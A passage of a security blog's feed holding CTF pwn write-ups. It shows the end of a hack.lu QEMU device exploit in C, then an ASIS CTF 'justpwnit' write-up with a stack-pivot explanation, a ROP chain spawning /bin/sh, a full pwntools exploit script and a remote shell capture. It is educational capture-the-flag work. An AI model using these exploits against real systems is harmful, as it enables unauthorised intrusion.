<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="c1">// So we just have to read the flag @ leak_rwx + 0x5000
</span><span class="c1"></span>
<span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] CloudInspectState.mmio.ops = original ops</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reading the flag @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">leak_rwx</span> <span class="o">-</span> <span class="n">addr_obj</span> <span class="o">+</span> <span class="mh">0x5000</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&#34;Failed to read the flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">memcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">dmabuf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>


<span class="c1">// adresses are different because here is another execution on the remote challenge
</span><span class="c1"></span><span class="cm">/*
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops.read () =&gt; jmp @ 7fe3dc001000\r\r\n&#39;
</span><span class="cm">b&#39;[*] CloudInspectState.mmio.ops = original ops\r\r\n&#39;
</span><span class="cm">b&#39;[*] Reading the flag @ 7fe3dc005000\r\r\n&#39;
</span><span class="cm">b&#39;flag: flag{cloudinspect_inspects_your_cloud_0107}\r\r\n&#39;
</span><span class="cm">
</span><span class="cm">flag: flag{cloudinspect_inspects_your_cloud_0107}
</span><span class="cm">*/</span>
</code></pre></div><p>Thanks for the organizers for this awesome event! The other pwn challenges look like very interesting as well!
You can the final exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/hack.lu/pwn/cloudinspect/remote.c"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >Interesting article about PCI devices</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt"
  
  >Linux kernel PCI documentation</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >Linux kernel pagemap documentation</a
></li>
</ul>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/hack.lu" term="hack.lu" label="hack.lu" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-read" term="arbitrary-read" label="arbitrary read" />
                             
                                <category scheme="https://nasm.re/tags/arbitrary-write" term="arbitrary-write" label="arbitrary write" />
                             
                                <category scheme="https://nasm.re/tags/hypervisor" term="hypervisor" label="hypervisor" />
                             
                                <category scheme="https://nasm.re/tags/qemu" term="qemu" label="qemu" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[ASIS CTF QUALS 2021 - pwn] abbr & justpwnit]]></title>
            <link href="https://nasm.re/posts/pwnasis/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/pwnasis/</id>
            
            <published>2021-10-24T00:00:00+00:00</published>
            <updated>2021-10-24T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<p>Hello folks ! Here is a write up for the two first pwn challenges of the ASIS CTF.
You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/blob/master/2021/asisctf"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="justpwnit">
        justpwnit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#justpwnit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor justpwnit" href="#justpwnit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
The binary is statically linked and here is the checksec&rsquo;s output:</p>
<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
Here it is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
</span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
</span><span class="cm"> */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define STR_SIZE 0x80
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">set_element</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">parray</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%*c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">STR_SIZE</span><span class="p">)))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">parray</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">STR_SIZE</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">justpwnit</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">set_element</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">180</span><span class="p">);</span>
  <span class="n">justpwnit</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
<p>Let&rsquo;s see this in gdb !</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
04:0020│         0x7ffef0386500 ◂— 0x0
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│ rax     0x7ffef0386520 ◂— 0xb4
09:0048│         0x7ffef0386528 ◂— 0x0
... ↓            4 skipped
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
</code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
<p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
04:0020│         0x7ffef0386500 ◂— 0x0                                                                                                                                                         
05:0028│         0x7ffef0386508 —▸ 0x40123d (main) ◂— endbr64                                                                                                                                  
06:0030│ rbx rbp 0x7ffef0386510 —▸ 0x7f2e4aea1050 ◂— 0x0                                                                                                                                       
07:0038│         0x7ffef0386518 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1                                                                                                    
08:0040│         0x7ffef0386520 ◂— 0xb4                                                                                                                                                        
09:0048│         0x7ffef0386528 ◂— 0x0                                                                                                                                                         
... ↓            4 skipped                                                                                                                                                                     
0e:0070│         0x7ffef0386550 —▸ 0x7ffef0386560 ◂— 0x1                                                                                                                                       
0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0                                                                                                                         
</code></pre><p>The saved <code>$rbp</code> has been overwritten with a pointer to the user input. Then, at the end of the <code>set_element</code> function, <code>$rbp</code> is popped from the stack and contains a pointer to the user input. Which causes at the end of the <code>justpwnit</code> function, the <code>leave</code> instruction moves the pointer to the user input in <code>$rsp</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Once we can pivot the stack to makes it point to some user controlled areas, we just have to rop through all the gadgets we can find in the binary.
The binary is statically linked, and there is no system function in the binary, so we can&rsquo;t make a ret2system, we have to make a <code>execve(&quot;/bin/sh\0&quot;, NULL, NULL)</code>.</p>
<p>And so what we need is:</p>
<ul>
<li>pop rdi gadget</li>
<li>pop rsi gadget</li>
<li>pop rdx gadget</li>
<li>pop rax gadget</li>
<li>syscall gadget</li>
<li>mov qword ptr [reg], reg [to write &ldquo;/bin/sh\0&rdquo;] in a writable area</li>
</ul>
<p>We can easily find these gadgets with the help <a
  class="gblog-markdown__link"
  href="https://github.com/JonathanSalwan/ROPgadget"
  
  >ROPgadget</a
>.
We got:</p>
<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
0x0000000000401001 : pop rax ; ret
0x00000000004019a3 : pop rsi ; ret
0x00000000004013e9 : syscall
0x0000000000403d23 : pop rdx ; ret
0x0000000000401b0d : pop rdi ; ret
</code></pre><p>Now we just have to craft the ropchain !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>
<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</code></pre></div><p>And we can enjoy the shell !</p>
<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
[*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 168.119.108.148 on port 11010: Done
[*] Switching to interactive mode
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls
chall
flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="full-exploit">
        Full exploit
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfinit</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">set follow-fork-mode parent
</span><span class="s1">b* main
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;-2&#34;</span><span class="p">)</span>

<span class="c1"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span>
<span class="c1"># 0x0000000000401001 : pop rax ; ret</span>
<span class="c1"># 0x00000000004019a3 : pop rsi ; ret</span>
<span class="c1"># 0x00000000004013e9 : syscall</span>
<span class="c1"># 0x0000000000403d23 : pop rdx ; ret</span>
<span class="c1"># 0x0000000000401b0d : pop rdi ; ret</span>

<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>

<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="abbr">
        abbr
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#abbr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor abbr" href="#abbr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
<p>Here is the source code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
